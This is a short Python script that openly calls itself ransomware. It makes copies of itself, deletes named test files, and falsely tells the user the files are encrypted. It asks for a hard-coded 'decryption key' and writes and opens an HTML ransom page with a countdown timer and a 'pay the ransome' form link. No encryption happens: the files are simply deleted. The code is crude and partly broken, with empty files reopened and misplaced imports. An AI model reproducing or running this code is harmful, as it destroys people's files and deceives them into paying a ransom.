# importing the modules
import os
import shutil

print("Ransomeware built by The Computer Guy & EHO")
print("Copyright 2020-2050 The Computer Guy & EHO. All Rights Reserved.")

# getting the current working directory
src_dir = os.getcwd()

# printing current directory
print(src_dir) 

# copying the files
shutil.copyfile('test_file.txt', 'virus.bullett') #copy src to dst
shutil.copyfile('pbullett_27_ransomeware.py', 'pbullett_27_ransomeware2.py')
shutil.copyfile('pbullett_27_ransomeware.py', 'pbullett_27_ransomeware3.py')
shutil.copyfile('pbullett_27_ransomeware.py', 'pbullett_27_ransomeware4.py')

# printing the list of new files
import os
os.remove("test_file 2.txt")
import os
os.remove("test_file.txt")
import os
os.remove("test_file.txt.zip")






print("oops your important files are encrypted")
#password:
pwd = input('Please enter the decryption key to decrypt your files ')
if pwd == 'apple':  
    print('Checking password')
    print('Sucsessfull')
    import os
    os.remove("virus.bullett")
    f = open("test_file.txt", "w")
    f = open("test_file 2.txt", "w")
    f = open("test_file.txt.zip", "w")
    os.remove("pbullett_27_ransomeware2.py")
    os.remove("pbullett_27_ransomeware3.py")
    os.remove("pbullett_27_ransomeware4.py")
    os.remove("Pay The Ransome.html")

else:
    print('Incorrect decryption key. ')
    print('Are you sure you paid the ransome')
    print('to see if your ransome has been paid look at this website')
    import time
 
# Wait for 10 seconds
time.sleep(10)


# write-html.pys
import webbrowser
import os
print ()
f = open('Pay The Ransome.html','w')
message = """<html>
<body style="background-color:orange;">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
p {
  text-align: center;
  font-size: 60px;
  margin-top: 0px;
}
</style>
</head>
<body>
<h1>oops your important files are encrypted</h1>
<p id="demo"></p>

<script>
// Set the date we're counting down to
var countDownDate = new Date("Jan 20, 2021 15:37:25").getTime();

// Update the count down every 1 second
var x = setInterval(function() {

  // Get today's date and time
  var now = new Date().getTime();
    2
  // Find the distance between now and the count down date
  var distance = countDownDate - now;
    
  // Time calculations for days, hours, minutes and seconds
  var days = Math.floor(distance / (1000 * 60 * 60 * 24));
  var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
  var seconds = Math.floor((distance % (1000 * 60)) / 1000);
    
  // Output the result in an element with id="demo"
  document.getElementById("demo").innerHTML = days + "d " + hours + "h "
  + minutes + "m " + seconds + "s ";
    
  // If the count down is over, write some text 
  if (distance < 0) {
    clearInterval(x);
    document.getElementById("demo").innerHTML = "EXPIRED";
  }
}, 1000);
</script>

</head>
<body>
<h1>Pay The Ransome To Decrypt Your Files</h1>
    
 <form action="https://www.emailmeform.com/builder/form/hg2wXGrB3tQ1yWd23fc">
         <button type="submit">Click here to pay the ransome</button>
      </form>

</body>
</html>"""
 
f.write(message)
f.close()

#Change path to reflect file location
filename = 'file:///'+os.getcwd()+'/' + 'Pay The Ransome.html'
webbrowser.open_new_tab(filename)


